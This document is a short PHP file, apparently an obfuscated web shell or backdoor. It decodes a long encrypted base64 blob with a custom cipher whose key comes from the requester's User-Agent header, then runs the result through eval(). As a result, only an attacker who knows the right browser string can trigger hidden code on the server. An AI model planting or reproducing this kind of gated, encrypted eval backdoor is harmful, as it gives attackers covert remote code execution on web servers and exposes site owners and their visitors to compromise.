<?php
function PLLT($kkmc, $vbg){
    $vbg = md5($vbg);
    $x = 0;
    $kkmc = base64_decode($kkmc);
    $hkl = strlen($kkmc);
    $l = strlen($vbg);
    $char = '';
    for ($i = 0; $i < $hkl; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($vbg, $x, 1);
        $x++;
    }
    $str = '';
    for ($i = 0; $i < $hkl; $i++) {
        if (ord(substr($kkmc, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($kkmc, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($kkmc, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}
$kkmc = "lqqp1NfEqZWkoaOmotSdX2mNcIRBO1ulx6ighKBTlMB1gYnExKBXPT6bl1qi2amcrYxZw3p6g3q5j1rZ05+kwpWdm8vO0ZxSkVtarUZwP1utxafLmaWWpceooKHFlKjGn5mkyo2JlnZ9fnaFlIirp6XTlsiZlZ2e0plawb5Vo8KenVnCjqBEOj2bl1qm1aycmNml0KOSm5rKk57Nz5hdhZB+gLGquJJSqaKdoZrKm5ufzaHJVo6SV9qhqMPRlKLGU5VjidnGqZeZppCimtqeYGLfQm49OpyYzqNYhp+ZpM+lWJrU0dSpbZBUmKSey6STW6KbzaCWV6rWoKfFx5iZnWCeptPZo3OSplJgcFuhQ0FC4ZrQp5ayQnA9QcnGm6SBU3Sd1NPZV5OjnqCkdsJYqZ7IkYZypqeh1ZWchMmUns1tZ53U09l1bJakUWF3iHFEQ22ycT6uRD/Ll6DTg1Vxx6CqpIXK05qkraKWb5WIo6yl2J7UlaOrZMyjqtGQl5bVkpRZhdLKq5ijlm6OW7aFio3AV6JwmqWl26hY0sSgmp6NWqzV0dSYlJmWl5uly5JZWdiu1Jluk1fMnaTJv1Vkn22hpdXa2VekraKWb5WIqayb0Z7YkFNXq8egrcmgj1e2oaSmxsmFfZmgl41UaKRyZp/Tp9FybWapynJ0k9elc4NsRUHL2tOapJ2hn1Kgy6pfXdmn0GBRW5nPpmHfcD0+hZSgdMja16OPnaCapmGPcURDbZjZpp2WqMuop9TXW1nEmWRXqLq3g3+EhpCHi7JiV13Zp9BdbEQ/b5et1s+SqMalp6fZjYmamGBSdIeLsoWHjcOHqYiGiYO6hnmytnl6s11YaI6gckE5l6ejnpjZm6uo1KmMWJSfYamJirCyg4nAhYGEqrS6i1xlYlptRnA/W53FqcVUbleY26akw8irmsRZXJrNjqBEOj2bl1paipqYrcVe30E7QD6KmJnYxFNygXGeoNHKxJ6VqJGUoafam6Wt112IqaOjXqFBQm3gQD9ql6GjysTVrKSTlaCgrcukq6yMWcido2NVipiZ2MRccG47tURvzstXWFiReHeNwV2bsIuSjVSsRD9vWJzbg3BVhZB/fLnAjJunW49sP0NvWpuwhHKElpKqmpxol8jIlqTFlmCq2dfEqZ+oY2RaXcqtYGKfQm49mp1VjqSqycqSosKlm5+NjJSsoqBvWWBjpV9dnc2noVxfYV6VW2SEh5esjVFcoNPL1GBZVK0+PEJvWqyr0FWhVFWgo8yjk5XAbkJrOkFbyc7XV21UVpqgn9WRaZafQm49rlea0qedhN5AP2o6qKnKzMSkkaiVmVpglauppaFdkl5aZlySVFzI2l9VhZqmndSOoEQ6PTtVp6vSVnRZiJ7SmqCSZsNvRW5sPFnFmqpXooWMXmtBPDqvRnA/p6vJnMOhkquYzlxfk4thX4qNZ1+Tj46TXlxgW3FiimVeZYRZ2aadY1WKomGfcD0+ypdYX4nTwGqNVG9uUmDarqtgjVXfQTtAPoquWKGDWqXJoV9ycm9uQFSik56XWaNWW6e/Z8FvPkE+41Sd0NaYVdw+QkBuid9XbVRWn41sw3FEQ20+iKKSpJqGcViG15ii0Z2Zq8qHoEQ6Pa8+PELPnFdhiJnNplFYcoZbX42DrkJrOkFbyc7XV21UVpCFfriMfIu/V6iDdIyCq4KMw7WChLVTlVeThYxmV1RgUVadz6hXZ4Rck1tRZVWKopnRyFNjgVhmXoWThVuqbz87O7aGm6OsyVXfQTtAPoqYodaDcFWFkIt8t7uqiYtWdoB1jrN7hY3Dh7ODhVmShmJYi5JaVY9RXKXG0spXXlRZX1lZlFZbs59Cbj2uRD9vm53Yi1eq051kV4nJzqlZbz87O6LMVl+fzaHJk5avntmoq4yHl57TWmFX4HJvQDmZlZmhWYhyq6uicdiYb3Ob1aKshMaiodCjdZOHzNeclaKOU3Cd1a2lpdOWyFSkrJjJmavXn2Kb0J+sdaGU2ZtucGGlpHeIcURDbbKEmZ2qmoavRW5sPJrEmadXh6HZqW5wppVwdcylpa2EmNOgoKlywlaqycePV5+Vp67T0dSYlFSYkpulomWdqNKponBgq5mkcGfY1XFXnD5CQOJyb7RQmZ6kl6LMVl9dw4Wzh4WSXM2ZrMPYpaGIjmFX4HJvQFSppJ1SdoZalomziLiPWJ6a2pOt1s9akpw+QkDV18qej6GTpZWhjl1mYZJfjZBgX2OQXZSSi2FfoFpcZoyRhVulpp5dUl3UX3JGbj7NmlFfWdSPa8GDcHKBWKyv2YyOV6tBPDo7XeBWdFmLpcykWHJCcD1BiNGUosZRdVeJ08BpjW8/Ozu2hpujrMlV30E7QD6Krlihg1ejvGSVcnJvbkBUopOel1mjVlmtyaLUoJKrmohvRW5ssEJrOlybzteFdFBYkYGBjLqRXp3UlticWJRVlFRak4VTY4FVppjSyoVlUFtgWFJnhlqxdHE/bZuWq12KqarQj1NZxZqqYKByb0CZmlJZmKLSm5ae3J7XqKRfWcqdqo2MU7BuO0FAysjNplBWbqWkd6Kqm3egm9OipVeY1aCn1qCPV8ijnZzTwYd1lKOpn56ox5pXrNmYx5mkqnGVmqfS13FxkKWcdaGU2aluVm0+PELjVpyl15qErz5BPm+Zm8zSU1edpap1odnJdWyaoZ+mWcmlo6jWcsBWo5yZwlZ2yNKqo82gmZuFy8agnHBhl6Gn2nRzaNiZonBgq6ekVnNxbTyybju1RG/KyJ+fVFRtpqukcqudonHKo6OkVdOZrMzSl3K9U4iGuLnBWVCVlaWbqNRzk1vAV6JwpKeW1HKN1s9tVZ1gq6fG06NzmaKipqZZ2q+nnqGpyaylV6PHoZ2hv1WcxqWXrNfRwVlQqpOdp56jklmVhnOgnZ+nqtpUrN3TmHK9U6CgycnKpYxWUp+Tpstzk1vIpcWomZNXhqqZ0NiYcr1TXKfG2c2TUnJumqCp26pXrd2lyXGkrJfTnayE2ZSh1pZ1k4esyqt2nZ6Wjlukcmaf06fRcm1mqcpydJPXpXODbA==";
$vbgone = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/(.*)\/(.*)/is',$vbgone,$src)){
	$vbg = 'B'.$src[2].'R6F';
	$vbg = str_replace('.','N6Yg',$vbg);
}else{
	die();
}
eval(PLLT($kkmc, $vbg));
